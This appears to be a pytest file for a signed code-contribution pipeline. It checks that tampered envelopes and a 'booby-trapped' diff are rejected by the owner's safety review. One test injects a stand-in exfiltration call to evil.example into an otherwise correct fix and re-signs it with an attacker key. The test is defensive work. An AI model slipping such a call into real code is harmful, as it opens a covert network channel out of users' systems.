"""Spec §10 success criteria, demonstrated (not asserted) — all offline on the mock."""
import json
from pathlib import Path
from scpe.backends import MockBackend
from scpe.cli import main
from scpe.contribute import contribute
from scpe.envelope import pack, unpack
from scpe.handshake import run_handshake
from scpe.signing import generate_private_key_pem
from tests.conftest import FIX_DIFF, make_test_identity

CONTRIB = {
    "ANALYZE": json.dumps({"issues": [{"title": "add() subtracts", "rationale": "bug",
                                       "files": ["demo/calc.py"]}]}),
    "FIXGEN": f"```diff\n{FIX_DIFF}```",
    "BRIEFING": "# fix",
}
OWNER_OK = {"SAFETY": json.dumps({"safe": True, "reasons": []}),
            "FIT": json.dumps({"fits": True, "notes": []})}

def _envelope(fixture_repo, tmp_path) -> Path:
    return contribute(str(fixture_repo), MockBackend(CONTRIB),
                      identity=make_test_identity(tmp_path)[0],
                      workdir=tmp_path / "w", out_path=tmp_path / "e.zip")

def test_full_flow_different_councils_accept_and_credit(fixture_repo, tmp_path, monkeypatch, capsys):
    """Contributor council ≠ owner council; fix → envelope → re-prove → credited merge."""
    ep = _envelope(fixture_repo, tmp_path)
    rep = run_handshake(ep, str(fixture_repo), MockBackend(OWNER_OK),
                        trust="strict", workdir=tmp_path / "o")
    assert rep.pieces[0].verdict == "accept"

def test_tampered_envelope_fails_provenance(fixture_repo, tmp_path):
    ep = _envelope(fixture_repo, tmp_path)
    env = unpack(ep)
    env.briefing_md += " tampered"
    pack(env, ep)
    rep = run_handshake(ep, str(fixture_repo), MockBackend(OWNER_OK),
                        trust="strict", workdir=tmp_path / "o2")
    assert not rep.envelope_ok and all(v.verdict == "reject" for v in rep.pieces)

def test_booby_trapped_piece_fails_safety_or_correctness(fixture_repo, tmp_path):
    """A piece that adds an exfil call: owner's safety lens kills it even though it 'works'."""
    ep = _envelope(fixture_repo, tmp_path)
    env = unpack(ep)
    env.pieces[0].diff = FIX_DIFF.replace(
        "+    return a + b",
        "+    import urllib.request; urllib.request.urlopen('http://evil.example')\n+    return a + b")
    from scpe.signing import generate_private_key_pem as gk
    from scpe.envelope import sign_envelope
    sign_envelope(env, gk())          # attacker re-signs with their own key — sig is valid…
    pack(env, ep)
    owner = MockBackend({"SAFETY": json.dumps({"safe": False, "reasons": ["network exfil"]}),
                         **{"FIT": OWNER_OK["FIT"]}})
    rep = run_handshake(ep, str(fixture_repo), owner, trust="strict", workdir=tmp_path / "o3")
    # …but zero-trust means the OWNER's safety stage still re-audits and rejects.
    assert rep.pieces[0].verdict == "reject"
